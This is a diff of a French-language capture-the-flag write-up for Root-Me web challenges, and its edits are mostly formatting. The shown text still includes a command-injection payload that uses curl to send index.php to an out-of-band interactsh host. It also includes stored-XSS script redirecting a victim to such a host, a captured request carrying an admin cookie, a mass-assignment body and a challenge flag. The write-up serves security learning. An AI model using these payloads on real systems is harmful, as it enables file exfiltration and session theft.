@@ -292,7 +292,7 @@ Le paramètre `order` est utilisé directement dans une requête SQL sans être 
 
 [https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)
 
-## Étapes
+### Étapes
 
 On dispose d'un formulaire simple avec un seul input permettant de ping une IP.
 
@@ -313,8 +313,8 @@ On dispose d'un formulaire simple avec un seul input permettant de ping une IP.
   On utilisera `curl` vers `interactsh` pour exfiltrer le fichier.
 
 7. Toujours depuis le Repeater, on modifie le payload :\
-  `ip=127.0.0.1%0Acurl --data-binary @index.php rkiguqojccliuysokkwxsnm2zvs8hm5jd.oast.fun`\
-  <img src="images/cmd-injection3.png" alt="cmd-injection" width="800"/>
+  `ip=127.0.0.1%0Acurl --data-binary @index.php rkiguqojccliuysokkwxsnm2zvs8hm5jd.oast.fun`
+  <br /><img src="images/cmd-injection3.png" alt="cmd-injection" width="800"/>
 
     Explication des paramètres curl `--data-binary` et `@index.php`:
 
@@ -354,6 +354,8 @@ Dans notre cas, on a utilisé `curl` pour exfiltrer les fichiers `index.php` et 
 
 [https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2](https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2)
 
+### Étapes
+
 Essayer de mettre des scripts grâce à payload all the thing dans le texte de contact ne marche pas
 On a un status en haut a droite "invite". Comme le chall dit de voler un cookie.
 Ouvrir les cookies dans le navigateur et regarder le cookie status=invite.
@@ -361,37 +363,37 @@ Mais le changer par admin ne donne pas plus de droit
 
 1. Ouvrir l'inspecteur, et constater le span avec la class admin
 
-```html
-<span><b>test</b>&nbsp;(<i class="admin">status : admin</i>)</span><br/><span>test</span><br/><hr/>
-```
+  ```html
+  <span><b>test</b>&nbsp;(<i class="admin">status : admin</i>)</span><br/><span>test</span><br/><hr/>
+  ```
 
 2. Injecter cette payload :
 
-```html
-"><script>console.log('XSS')</script>
-```
+  ```html
+  "><script>console.log('XSS')</script>
+  ```
 
-Grâce à un serveur temporaire sur https://app.interactsh.com/#/ et une nouvelle payload :
+  Grâce à un serveur temporaire sur https://app.interactsh.com/#/ et une nouvelle payload :
 
-```html
-"><script>
-  window.location.href="http://hncvjxsvmdrftyrhlpzm4wzqy5sohi4el.oast.fun"
-</script>
-```
+  ```html
+  "><script>
+    window.location.href="http://hncvjxsvmdrftyrhlpzm4wzqy5sohi4el.oast.fun"
+  </script>
+  ```
 
 3. Récupérer la requete sur le serveur :
 
-```txt
-GET /?c=%22status=invite;%20ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F%22 HTTP/1.1
-Host: hncvjxsvmdrftyrhlpzm574z3js3wvjt1.oast.fun
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: fr
-Connection: keep-alive
-Referer: http://challenge01.root-me.org/
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/93.0.4577.0 Safari/537.36
-```
+  ```txt
+  GET /?c=%22status=invite;%20ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F%22 HTTP/1.1
+  Host: hncvjxsvmdrftyrhlpzm574z3js3wvjt1.oast.fun
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+  Accept-Encoding: gzip, deflate
+  Accept-Language: fr
+  Connection: keep-alive
+  Referer: http://challenge01.root-me.org/
+  Upgrade-Insecure-Requests: 1
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/93.0.4577.0 Safari/537.36
+  ```
 
 4. Ajouter le cookie admin pour se connecter a l'espace admin :
 
@@ -441,6 +443,7 @@ Grâce à https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%2
 `{"note":"admin","status":"admin","userid":7,"username":"attacker"}`
 
 Résultat :
+
 ```json
 {
   "message": "Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."
